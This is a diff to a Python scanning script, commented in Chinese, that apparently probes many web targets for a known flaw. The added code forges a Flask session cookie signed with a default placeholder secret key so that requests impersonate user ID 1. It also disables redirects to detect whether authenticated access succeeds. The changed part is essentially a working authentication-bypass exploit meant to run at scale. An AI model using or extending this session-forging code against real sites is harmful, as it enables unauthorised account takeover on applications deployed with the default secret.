@@ -5,15 +5,20 @@ import requests
 import sys
 import re
 import threading
+import subprocess
 from requests.exceptions import RequestException
 from urllib3.exceptions import InsecureRequestWarning
+
+command = ['python3', 'flask_session_cookie_manager3.py', 'encode', '-s', 'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET', '-t', "{'user_id': 1}"]
+session = subprocess.run(command, capture_output=True, text=True)
+sessionout = session.stdout.strip()
 
 # 自定义请求头字段
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
-    "Cookie": "session=eyJ1c2VyX2lkIjoxfQ.ZEnvAw.psuAEJtVOeGlEgnJGqKLKSLE5WE"
+    "Cookie": "session="+sessionout
 }
 
 vulurl=[]
@@ -45,7 +50,7 @@ def urltest(url):
 #漏洞检测
 def vultest(url):
     try:
-        response = requests.get(url, headers=headers, verify=False , timeout=3)
+        response = requests.get(url, headers=headers, verify=False , timeout=3, allow_redirects=False)
         parsed_url = urlsplit(url)
         url=parsed_url.scheme+"://"+parsed_url.netloc
         # 检查响应头的状态码是否为200
